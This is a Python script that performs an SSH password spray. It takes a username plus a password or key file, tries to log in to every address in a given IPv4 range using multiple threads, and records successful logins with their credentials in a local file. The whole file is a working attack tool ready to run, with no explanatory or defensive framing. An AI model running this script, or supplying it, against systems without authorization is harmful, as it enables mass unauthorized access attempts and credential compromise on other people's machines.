import socket
import os
import paramiko
import ipaddress
from ipaddress import IPv4Address, IPv4Network
import threading
from queue import Queue
import subprocess
import optparse
from optparse import OptionParser
import sys

if ((len(sys.argv) < 9 or len(sys.argv) > 9) and '-h' not in sys.argv):
    print("Usage: python3 %s -u <username> (-p <password> OR -k <ssh_key>) -r <IP Range> -t <# of threads>" % sys.argv[0])
    sys.exit(1)

parser = OptionParser()
parser.add_option("-u", "--username", help="username for the ssh password spray")
parser.add_option("-p", "--password", help="password for the ssh password spray")
parser.add_option("-r", "--range", help="IP range to spray")
parser.add_option("-t", "--threads", help="number of threads to use")
parser.add_option("-k", "--key", help="ssh key to use")
(options, args) = parser.parse_args()


if options.password and not options.key:
    username = options.username
    password = options.password
    iprange = options.range
    numthreads = options.threads
    scanrange = IPv4Network(iprange)

    count = 0
    iplist = []
    print("-"*40)

    string = "You are running a password spray with username '{}' and password '{}' against netblock {}."
    output = string.format(username,password,iprange)
    print(output)
    print("-"*40)
    print("Spraying...")
    iprange2 = str(scanrange)
    outfile = open("outfile.txt","w")

    ################
    def Connector(ip):
        try:
        
            ip2 = str(ip)
            ssh = paramiko.SSHClient()
            ssh.load_system_host_keys()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip2, port=22, username=username, password=password, timeout=1.0)
            print("\033[92mlogin successful - %s:%s@%s\033[0m" % (username, password, ip2))
            ssh.close()
            outfile.write("login successful - %s:%s@%s\n" % (username, password, ip2))
        except paramiko.AuthenticationException:
            print("\033[91mAuthentication failed: %s\033[0m" % (ip2))
            ssh.close()
            pass
        except:
            pass
    #################
    def threader():
        while True:
            worker = q.get()
            Connector(worker)
            q.task_done()
    #################
        
    q = Queue()

    for ip in ipaddress.IPv4Network(iprange2):
        count = count + 1
        iplist.append(str(ip))

    for x in range(int(numthreads)):
        t = threading.Thread(target=threader)
        t.daemon = True
        t.start()

    for worker in iplist:
        q.put(worker)

    q.join()
    
    outfile.close()
    print("-"*40)
    print("Spray done!")
    print("Data written to outfile.txt in the current directory")
    print("-"*40)

elif options.key and not options.password:
    username = options.username
    key = options.key
    iprange = options.range
    numthreads = options.threads
    scanrange = IPv4Network(iprange)

    count = 0
    iplist = []
    if os.path.exists(key):
        print("-"*40)
        string = "You are running a password spray with username '{}' and ssh key '{}' against netblock {}."
        output = string.format(username,key,iprange)
        print(output)
        print("-"*40)
        print("Spraying...")
        iprange2 = str(scanrange)
        outfile = open("outfile.txt","w")

        ################
        def Connector(ip):
            try:
        
                ip2 = str(ip)
                ssh = paramiko.SSHClient()
                ssh.load_system_host_keys()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip2, port=22, username=username, key_filename=key, timeout=1.0)
                print("\033[92mlogin successful - %s:%s@%s\033[0m" % (username, key, ip2))
                ssh.close()
                outfile.write("login successful - %s:%s@%s\n" % (username, key, ip2))
            except paramiko.ssh_exception.BadHostKeyException:
                print("\033[91mAuthentication failed: %s\033[0m" % (ip2))
                ssh.close()
                pass
            except paramiko.ssh_exception.SSHException:
                print("\033[91mAuthentication failed: %s\033[0m" % (ip2))
                ssh.close()
                pass
            except:
                pass
        #################
        def threader():
            while True:
                worker = q.get()
                Connector(worker)
                q.task_done()
        #################
        
        q = Queue()

        for ip in ipaddress.IPv4Network(iprange2):
            count = count + 1
            iplist.append(str(ip))

        for x in range(int(numthreads)):
            t = threading.Thread(target=threader)
            t.daemon = True
            t.start()

        for worker in iplist:
            q.put(worker)

        q.join()
    
        outfile.close()
        print("-"*40)
        print("Spray done!")
        print("Data written to outfile.txt in the current directory")
        print("-"*40)
    else:
        print("[-] The ssh key specified was not found. Exiting...")
        sys.exit(1)

else:
    print("Please set either a password or ssh key to use.")
    sys.exit(1)
    

